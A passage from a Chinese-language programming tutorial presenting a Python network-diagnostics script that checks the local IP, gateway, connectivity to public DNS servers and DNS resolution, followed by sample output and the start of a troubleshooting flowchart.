class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day14_network_inspector.py</span><br><span class="hljs-comment"># 功能：综合网络配置检测工具</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> platform<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkInspector</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    网络配置检测工具</span><br><span class="hljs-string"></span><br><span class="hljs-string">    功能：</span><br><span class="hljs-string">        1. 获取本机网络配置</span><br><span class="hljs-string">        2. 测试网络连通性</span><br><span class="hljs-string">        3. DNS解析测试</span><br><span class="hljs-string">        4. 生成诊断报告</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.system = platform.system()<br>        <span class="hljs-variable language_">self</span>.report = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_to_report</span>(<span class="hljs-params">self, section: <span class="hljs-built_in">str</span>, content: <span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;添加内容到报告&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;section&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-variable language_">self</span>.report.append(content)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取本机IP地址</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            本机IP地址字符串</span><br><span class="hljs-string"></span><br><span class="hljs-string">        工作原理：</span><br><span class="hljs-string">            创建UDP socket连接到外部地址（不实际发送数据）</span><br><span class="hljs-string">            从socket获取本机使用的IP地址</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 创建UDP socket</span><br>            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>            <span class="hljs-comment"># 连接到外部地址（Google DNS）</span><br>            s.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>            <span class="hljs-comment"># 获取socket使用的本地IP</span><br>            local_ip = s.getsockname()[<span class="hljs-number">0</span>]<br>            s.close()<br>            <span class="hljs-keyword">return</span> local_ip<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;获取失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hostname</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;获取主机名&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> socket.gethostname()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_network_interfaces</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取网络接口信息</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            包含接口信息的字典</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        interfaces = &#123;&#125;<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 获取主机名对应的所有IP地址</span><br>            hostname = socket.gethostname()<br>            local_ips = socket.gethostbyname_ex(hostname)[<span class="hljs-number">2</span>]<br><br>            interfaces[<span class="hljs-string">&#x27;主机名&#x27;</span>] = hostname<br>            interfaces[<span class="hljs-string">&#x27;本机IP&#x27;</span>] = <span class="hljs-variable language_">self</span>.get_local_ip()<br>            interfaces[<span class="hljs-string">&#x27;所有IP&#x27;</span>] = <span class="hljs-string">&#x27;, &#x27;</span>.join(local_ips)<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            interfaces[<span class="hljs-string">&#x27;错误&#x27;</span>] = <span class="hljs-built_in">str</span>(e)<br><br>        <span class="hljs-keyword">return</span> interfaces<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_connectivity</span>(<span class="hljs-params">self, host: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8.8.8.8&quot;</span>, port: <span class="hljs-built_in">int</span> = <span class="hljs-number">53</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        测试网络连通性</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            host: 目标主机</span><br><span class="hljs-string">            port: 目标端口</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            (是否连通, 详细信息)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 尝试建立TCP连接</span><br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(<span class="hljs-number">3</span>)<br>            start_time = socket.time.time()<br>            result = sock.connect_ex((host, port))<br>            end_time = socket.time.time()<br>            sock.close()<br><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                latency = (end_time - start_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># 转换为毫秒</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">f&quot;✅ 连接成功 (<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>) - 延迟: <span class="hljs-subst">&#123;latency:<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;❌ 连接失败 (<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>)&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;❌ 连接异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_dns</span>(<span class="hljs-params">self, domain: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;www.baidu.com&quot;</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        测试DNS解析</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            domain: 要解析的域名</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            (是否成功, 详细信息)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = socket.time.time()<br>            ip = socket.gethostbyname(domain)<br>            end_time = socket.time.time()<br><br>            query_time = (end_time - start_time) * <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, <span class="hljs-string">f&quot;✅ DNS解析成功\n   <span class="hljs-subst">&#123;domain&#125;</span> → <span class="hljs-subst">&#123;ip&#125;</span>\n   查询时间: <span class="hljs-subst">&#123;query_time:<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span><br>        <span class="hljs-keyword">except</span> socket.gaierror <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;❌ DNS解析失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">f&quot;❌ DNS查询异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_default_gateway</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取默认网关</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            默认网关IP地址</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.system == <span class="hljs-string">&quot;Windows&quot;</span>:<br>                result = subprocess.run(<br>                    [<span class="hljs-string">&#x27;ipconfig&#x27;</span>],<br>                    capture_output=<span class="hljs-literal">True</span>,<br>                    text=<span class="hljs-literal">True</span><br>                )<br>                output = result.stdout<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;默认网关&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;Default Gateway&#x27;</span> <span class="hljs-keyword">in</span> line:<br>                        parts = line.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">1</span>:<br>                            gateway = parts[<span class="hljs-number">1</span>].strip()<br>                            <span class="hljs-keyword">if</span> gateway <span class="hljs-keyword">and</span> gateway != <span class="hljs-string">&#x27;&#x27;</span>:<br>                                <span class="hljs-keyword">return</span> gateway<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># Linux/Mac</span><br>                result = subprocess.run(<br>                    [<span class="hljs-string">&#x27;ip&#x27;</span>, <span class="hljs-string">&#x27;route&#x27;</span>],<br>                    capture_output=<span class="hljs-literal">True</span>,<br>                    text=<span class="hljs-literal">True</span><br>                )<br>                output = result.stdout<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;default&#x27;</span> <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">2</span>:<br>                            <span class="hljs-keyword">return</span> parts[<span class="hljs-number">2</span>]<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;未找到&quot;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;获取失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_full_inspection</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        运行完整的网络检测</span><br><span class="hljs-string"></span><br><span class="hljs-string">        工作流程：</span><br><span class="hljs-string">            1. 获取本机网络配置</span><br><span class="hljs-string">            2. 测试本地连通性</span><br><span class="hljs-string">            3. 测试外网连通性</span><br><span class="hljs-string">            4. 测试DNS解析</span><br><span class="hljs-string">            5. 生成诊断报告</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; 网络配置检测工具 - Network Inspector&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br>        <span class="hljs-comment"># 1. 本机配置</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[1/5] 正在获取本机网络配置...&quot;</span>)<br>        interfaces = <span class="hljs-variable language_">self</span>.get_network_interfaces()<br>        gateway = <span class="hljs-variable language_">self</span>.get_default_gateway()<br><br>        config_info = []<br>        config_info.append(<span class="hljs-string">f&quot;主机名:    <span class="hljs-subst">&#123;interfaces.get(<span class="hljs-string">&#x27;主机名&#x27;</span>, <span class="hljs-string">&#x27;未知&#x27;</span>)&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;本机IP:    <span class="hljs-subst">&#123;interfaces.get(<span class="hljs-string">&#x27;本机IP&#x27;</span>, <span class="hljs-string">&#x27;未知&#x27;</span>)&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;默认网关:  <span class="hljs-subst">&#123;gateway&#125;</span>&quot;</span>)<br>        config_info.append(<span class="hljs-string">f&quot;操作系统:  <span class="hljs-subst">&#123;self.system&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;本机网络配置&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(config_info))<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> config_info:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 2. 测试网关连通性</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[2/5] 正在测试网关连通性...&quot;</span>)<br>        <span class="hljs-keyword">if</span> gateway != <span class="hljs-string">&quot;未找到&quot;</span> <span class="hljs-keyword">and</span> gateway != <span class="hljs-string">&quot;获取失败&quot;</span>:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_connectivity(gateway, <span class="hljs-number">80</span>)<br>            <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;网关连通性测试&quot;</span>, msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg = <span class="hljs-string">&quot;❌ 无法获取网关，跳过测试&quot;</span><br>            <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;网关连通性测试&quot;</span>, msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 3. 测试外网连通性</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[3/5] 正在测试外网连通性...&quot;</span>)<br>        test_hosts = [<br>            (<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;Google DNS&quot;</span>),<br>            (<span class="hljs-string">&quot;114.114.114.114&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;114 DNS&quot;</span>),<br>            (<span class="hljs-string">&quot;1.1.1.1&quot;</span>, <span class="hljs-number">53</span>, <span class="hljs-string">&quot;Cloudflare DNS&quot;</span>)<br>        ]<br><br>        connectivity_results = []<br>        <span class="hljs-keyword">for</span> host, port, name <span class="hljs-keyword">in</span> test_hosts:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_connectivity(host, port)<br>            connectivity_results.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name&#125;</span>: <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;外网连通性测试&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(connectivity_results))<br><br>        <span class="hljs-comment"># 4. 测试DNS</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[4/5] 正在测试DNS解析...&quot;</span>)<br>        test_domains = [<br>            <span class="hljs-string">&quot;www.baidu.com&quot;</span>,<br>            <span class="hljs-string">&quot;www.google.com&quot;</span>,<br>            <span class="hljs-string">&quot;www.github.com&quot;</span><br>        ]<br><br>        dns_results = []<br>        <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> test_domains:<br>            success, msg = <span class="hljs-variable language_">self</span>.test_dns(domain)<br>            dns_results.append(msg)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  <span class="hljs-subst">&#123;msg&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;DNS解析测试&quot;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>.join(dns_results))<br><br>        <span class="hljs-comment"># 5. 生成诊断建议</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[5/5] 正在生成诊断报告...&quot;</span>)<br>        diagnosis = <span class="hljs-variable language_">self</span>.generate_diagnosis()<br>        <span class="hljs-variable language_">self</span>.add_to_report(<span class="hljs-string">&quot;诊断建议&quot;</span>, diagnosis)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_diagnosis</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        生成诊断建议</span><br><span class="hljs-string"></span><br><span class="hljs-string">        返回值：</span><br><span class="hljs-string">            诊断建议字符串</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        suggestions = []<br><br>        <span class="hljs-comment"># 检查报告中的问题</span><br>        report_text = <span class="hljs-string">&#x27;\n&#x27;</span>.join(<span class="hljs-variable language_">self</span>.report)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;连接失败&#x27;</span> <span class="hljs-keyword">in</span> report_text <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;连接异常&#x27;</span> <span class="hljs-keyword">in</span> report_text:<br>            suggestions.append(<span class="hljs-string">&quot;⚠️  检测到网络连接问题：&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   1. 检查网线或WiFi连接&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   2. 检查防火墙设置&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   3. 尝试重启路由器&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DNS解析失败&#x27;</span> <span class="hljs-keyword">in</span> report_text:<br>            suggestions.append(<span class="hljs-string">&quot;\n⚠️  检测到DNS解析问题：&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   1. 检查DNS服务器配置&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   2. 尝试使用公共DNS (8.8.8.8)&quot;</span>)<br>            suggestions.append(<span class="hljs-string">&quot;   3. 清除DNS缓存&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> suggestions:<br>            suggestions.append(<span class="hljs-string">&quot;✅ 网络状态良好，未发现明显问题&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join(suggestions)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_report</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;打印完整报告&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; 完整诊断报告&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br>        <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.report:<br>            <span class="hljs-built_in">print</span>(section)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; 报告结束&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">save_report</span>(<span class="hljs-params">self, filename: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;network_report.txt&quot;</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        保存报告到文件</span><br><span class="hljs-string"></span><br><span class="hljs-string">        参数：</span><br><span class="hljs-string">            filename: 保存的文件名</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">&quot;网络配置检测报告\n&quot;</span>)<br>                f.write(<span class="hljs-string">f&quot;生成时间: <span class="hljs-subst">&#123;socket.time.ctime()&#125;</span>\n&quot;</span>)<br>                f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(<span class="hljs-variable language_">self</span>.report))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n✅ 报告已保存到: <span class="hljs-subst">&#123;filename&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n❌ 保存报告失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;主程序&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ╔══════════════════════════════════════════════════════════╗</span><br><span class="hljs-string">    ║       网络配置检测工具 v1.0                               ║</span><br><span class="hljs-string">    ║       Network Configuration Inspector                    ║</span><br><span class="hljs-string">    ╚══════════════════════════════════════════════════════════╝</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    inspector = NetworkInspector()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 运行完整检测</span><br>        inspector.run_full_inspection()<br><br>        <span class="hljs-comment"># 打印报告</span><br>        inspector.print_report()<br><br>        <span class="hljs-comment"># 保存报告</span><br>        save_option = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n是否保存报告到文件？(y/n): &quot;</span>).strip().lower()<br>        <span class="hljs-keyword">if</span> save_option == <span class="hljs-string">&#x27;y&#x27;</span>:<br>            filename = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入文件名 (默认: network_report.txt): &quot;</span>).strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>                filename = <span class="hljs-string">&quot;network_report.txt&quot;</span><br>            inspector.save_report(filename)<br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\n用户中断程序&quot;</span>)<br>        sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n❌ 程序异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="3-3-运行示例">3.3 运行示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 运行程序</span><br>python code/day14/day14_network_inspector.py<br><br>输出示例：<br>╔══════════════════════════════════════════════════════════╗<br>║       网络配置检测工具 v1.0                               ║<br>║       Network Configuration Inspector                    ║<br>╚══════════════════════════════════════════════════════════╝<br><br>============================================================<br> 网络配置检测工具 - Network Inspector<br>============================================================<br><br>[1/5] 正在获取本机网络配置...<br>  主机名:    DESKTOP-ABC123<br>  本机IP:    192.168.1.100<br>  默认网关:  192.168.1.1<br>  操作系统:  Windows<br><br>[2/5] 正在测试网关连通性...<br>  ✅ 连接成功 (192.168.1.1:80) - 延迟: 1.23ms<br><br>[3/5] 正在测试外网连通性...<br>  ✅ 连接成功 (8.8.8.8:53) - 延迟: 15.67ms<br>  ✅ 连接成功 (114.114.114.114:53) - 延迟: 12.34ms<br>  ✅ 连接成功 (1.1.1.1:53) - 延迟: 18.90ms<br><br>[4/5] 正在测试DNS解析...<br>  ✅ DNS解析成功<br>     www.baidu.com → 39.156.66.10<br>     查询时间: 45.67ms<br>  ✅ DNS解析成功<br>     www.google.com → 172.217.160.68<br>     查询时间: 23.45ms<br>  ✅ DNS解析成功<br>     www.github.com → 20.205.243.166<br>     查询时间: 34.56ms<br><br>[5/5] 正在生成诊断报告...<br></code></pre></td></tr></table></figure><hr><h2 id="4-常见网络问题诊断">4. 常见网络问题诊断</h2><h3 id="4-1-问题诊断流程图">4.1 问题诊断流程图</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dos">网络无法访问？<br>│<br>├─ 步骤<span class="hljs-number">1</span>: 检查物理连接<br>│   ├─ 网线是否插好？<br>│   ├─ WiFi是否连接？<br>│   └─ 